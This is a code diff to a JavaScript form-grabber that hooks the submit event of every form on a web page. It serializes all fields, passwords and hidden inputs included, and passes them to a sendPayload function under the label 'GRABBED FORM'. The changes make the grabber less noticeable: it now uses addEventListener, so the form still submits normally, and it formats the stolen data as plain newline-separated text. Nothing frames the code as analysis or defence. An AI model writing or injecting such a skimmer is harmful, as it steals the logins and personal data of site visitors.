@@ -4,74 +4,22 @@ function serialize(form) {
         return;
     }
     var i, j, q = [];
-    for (i = form.elements.length - 1; i >= 0; i = i - 1) {
-        if (form.elements[i].name === "") {
-            continue;
-        }
-        switch (form.elements[i].nodeName) {
-        case 'INPUT':
-            switch (form.elements[i].type) {
-            case 'text':
-            case 'hidden':
-            case 'password':
-            case 'button':
-            case 'reset':
-            case 'submit':
-                q.push(form.elements[i].name + "=" + encodeURIComponent(form.elements[i].value));
-                break;
-            case 'checkbox':
-            case 'radio':
-                if (form.elements[i].checked) {
-                    q.push(form.elements[i].name + "=" + encodeURIComponent(form.elements[i].value));
-                }
-                break;
-            }
-            break;
-        case 'file':
-            break;
-        case 'TEXTAREA':
-            q.push(form.elements[i].name + "=" + encodeURIComponent(form.elements[i].value));
-            break;
-        case 'SELECT':
-            switch (form.elements[i].type) {
-            case 'select-one':
-                q.push(form.elements[i].name + "=" + encodeURIComponent(form.elements[i].value));
-                break;
-            case 'select-multiple':
-                for (j = form.elements[i].options.length - 1; j >= 0; j = j - 1) {
-                    if (form.elements[i].options[j].selected) {
-                        q.push(form.elements[i].name + "=" + encodeURIComponent(form.elements[i].options[j].value));
-                    }
-                }
-                break;
-            }
-            break;
-        case 'BUTTON':
-            switch (form.elements[i].type) {
-            case 'reset':
-            case 'submit':
-            case 'button':
-                q.push(form.elements[i].name + "=" + encodeURIComponent(form.elements[i].value));
-                break;
-            }
-            break;
-        }
+    for (i = 0; i <  form.elements.length; i++) {
+        if (form.elements[i].name != "") q.push(form.elements[i].name + "=" + form.elements[i].value);        
     }
-    data = q.join("&");
+    data = q.join("\n");
     return data;
 }
 
-var formsCollection = document.getElementsByTagName("form");
-for(var i=0;i<formsCollection.length;i++)
+
+for (var i=0;i<document.getElementsByTagName("form").length;i++)
 {
-    console.log("set onsubmit on form " + i);
-    formsCollection[i].onsubmit = function() {
+
+    document.getElementsByTagName("form")[i].addEventListener('submit', function() {
         for(var ii=0;ii<document.getElementsByTagName("form").length;ii++) {
-            sendPayload("Login event - DATA:" + serialize(document.getElementsByTagName("form")[ii]));
+            sendPayload("----- GRABBED FORM " + document.getElementsByTagName("form")[ii].name + " -----\nDATA:\n" + serialize(document.getElementsByTagName("form")[ii])+ "\n");
         }
-        return false;
-    }
-   
-    
+
+    });       
 }
 
